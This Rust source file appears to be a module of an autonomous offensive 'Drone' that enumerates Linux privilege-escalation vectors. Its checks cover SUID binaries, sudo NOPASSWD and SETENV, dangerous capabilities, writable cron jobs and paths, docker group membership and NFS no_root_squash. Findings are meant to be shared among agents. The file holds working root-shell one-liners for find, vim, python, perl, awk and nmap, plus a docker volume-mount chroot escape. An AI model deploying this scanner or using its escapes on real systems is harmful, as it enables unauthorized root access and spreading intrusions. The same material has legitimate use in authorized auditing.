// Privilege Escalation via misconfiguration abuse (no exploits needed).
// The Drone searches for SUID binaries, sudo misconfigs, and capabilities
// that allow privilege escalation without a single 0-day.
// Techniques found are shared via Death Dance/Waggle Dance.

use std::process::Command;
use tracing::info;

/// Privilege escalation vector found on the system.
#[derive(Debug, Clone)]
pub struct PrivEscVector {
    pub technique: String,
    pub binary: String,
    pub confidence: f32,     // 0-1, how likely this works
    pub description: String,
    pub mitre_id: &'static str,
}

/// Scan the system for privilege escalation vectors.
pub fn scan_privilege_escalation() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();

    vectors.extend(scan_suid_binaries());
    vectors.extend(scan_sudo_misconfigs());
    vectors.extend(scan_capabilities());
    vectors.extend(scan_writable_paths());
    vectors.extend(scan_docker_group());
    vectors.extend(scan_cron_jobs());
    vectors.extend(scan_nfs_shares());

    info!("PRIVESC: found {} potential vectors", vectors.len());
    vectors
}

/// Find SUID binaries that can be exploited.
fn scan_suid_binaries() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();
    let known_exploitable = [
        ("find", "T1548.001", "find . -exec /bin/sh -p \\; -quit"),
        ("vim", "T1548.001", "vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\")'"),
        ("bash", "T1548.001", "bash -p"),
        ("python", "T1548.001", "python -c 'import os; os.execl(\"/bin/sh\",\"sh\")'"),
        ("perl", "T1548.001", "perl -e 'exec \"/bin/sh\";'"),
        ("less", "T1548.001", "less /etc/passwd → !/bin/sh"),
        ("awk", "T1548.001", "awk 'BEGIN {system(\"/bin/sh\")}'"),
        ("nmap", "T1548.001", "nmap --interactive → !sh"),
        ("systemctl", "T1543.002", "systemctl → !sh (old versions)"),
    ];

    if let Ok(out) = Command::new("find").args(["/", "-perm", "-4000", "-type", "f", "-ls", "2>/dev/null"]).output() {
        let text = String::from_utf8_lossy(&out.stdout);
        for (name, mitre, technique) in &known_exploitable {
            if text.contains(name) {
                vectors.push(PrivEscVector {
                    technique: technique.to_string(),
                    binary: name.to_string(),
                    confidence: 0.9,
                    description: format!("SUID {} found — {}", name, technique),
                    mitre_id: mitre,
                });
            }
        }
    }
    vectors
}

/// Check sudo misconfigurations.
fn scan_sudo_misconfigs() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();

    if let Ok(out) = Command::new("sudo").arg("-l").output() {
        let text = String::from_utf8_lossy(&out.stdout);
        if text.contains("(ALL) NOPASSWD:") {
            vectors.push(PrivEscVector {
                technique: "sudo NOPASSWD".into(),
                binary: text.split("NOPASSWD:").nth(1).unwrap_or("?").trim().to_string(),
                confidence: 1.0,
                description: "Sudo NOPASSWD configured — full root access".into(),
                mitre_id: "T1548.003",
            });
        }
        if text.contains("(root) SETENV:") {
            vectors.push(PrivEscVector {
                technique: "LD_PRELOAD via SETENV".into(),
                binary: "sudo".into(),
                confidence: 0.7,
                description: "Sudo SETENV allows LD_PRELOAD injection".into(),
                mitre_id: "T1574.006",
            });
        }
    }

    // Check if user is in sudo group
    if let Ok(out) = Command::new("groups").output() {
        let text = String::from_utf8_lossy(&out.stdout);
        if text.contains("sudo") || text.contains("wheel") {
            vectors.push(PrivEscVector {
                technique: "sudo group membership".into(),
                binary: "sudo".into(),
                confidence: 0.5,
                description: "User is in sudo/wheel group".into(),
                mitre_id: "T1548.003",
            });
        }
    }

    vectors
}

/// Check Linux capabilities that can be abused.
fn scan_capabilities() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();

    if let Ok(out) = Command::new("getcap").arg("-r").arg("/").arg("2>/dev/null").output() {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            if line.contains("cap_setuid") || line.contains("cap_sys_admin") {
                vectors.push(PrivEscVector {
                    technique: format!("capability abuse: {}", line),
                    binary: line.split_whitespace().next().unwrap_or("?").to_string(),
                    confidence: 0.6,
                    description: "Dangerous Linux capability found".into(),
                    mitre_id: "T1548.001",
                });
            }
        }
    }
    vectors
}

/// Check writable paths in root's PATH.
fn scan_writable_paths() -> Vec<PrivEscVector> {
    let mut vectors = Vec::new();

    for path in &["/etc/cron.hourly", "/etc/cron.daily", "/usr/local/bin",
                   "/opt", "/tmp", "/dev/shm"] {
        if let Ok(meta) = std::fs::metadata(path) {
            #[cfg(unix)] {
                use std::os::unix::fs::PermissionsExt;
                if meta.permissions().mode() & 0o002 != 0 {
                    vectors.push(PrivEscVector {
                        technique: format!("writable path: {}", path),
                        binary: path.to_string(),
                        confidence: 0.4,
                        description: format!("{} is world-writable", path),
                        mitre_id: "T1574.001",
                    });
                }
            }
        }
    }
    vectors
}

/// Docker group membership = easy root.
fn scan_docker_group() -> Vec<PrivEscVector> {
    if let Ok(out) = Command::new("groups").output() {
        if String::from_utf8_lossy(&out.stdout).contains("docker") {
            return vec![PrivEscVector {
                technique: "docker run -v /:/mnt --rm -it alpine chroot /mnt".into(),
                binary: "docker".into(),
                confidence: 1.0,
                description: "Docker group = full root via volume mount".into(),
                mitre_id: "T1548.001",
            }];
        }
    }
    Vec::new()
}

/// Writable cron jobs.
fn scan_cron_jobs() -> Vec<PrivEscVector> {
    for dir in &["/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/var/spool/cron/crontabs"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                #[cfg(unix)] {
                    use std::os::unix::fs::PermissionsExt;
                    if let Ok(meta) = entry.metadata() {
                        if meta.permissions().mode() & 0o002 != 0 {
                            return vec![PrivEscVector {
                                technique: format!("writable cron: {}", entry.path().display()),
                                binary: entry.path().display().to_string(),
                                confidence: 0.8,
                                description: "Writable cron job found".into(),
                                mitre_id: "T1053.003",
                            }];
                        }
                    }
                }
            }
        }
    }
    Vec::new()
}

/// NFS shares with no_root_squash.
fn scan_nfs_shares() -> Vec<PrivEscVector> {
    if let Ok(content) = std::fs::read_to_string("/etc/exports") {
        if content.contains("no_root_squash") {
            return vec![PrivEscVector {
                technique: "NFS no_root_squash exploit".into(),
                binary: "/etc/exports".into(),
                confidence: 0.7,
                description: "NFS export with no_root_squash found".into(),
                mitre_id: "T1548.001",
            }];
        }
    }
    Vec::new()
}
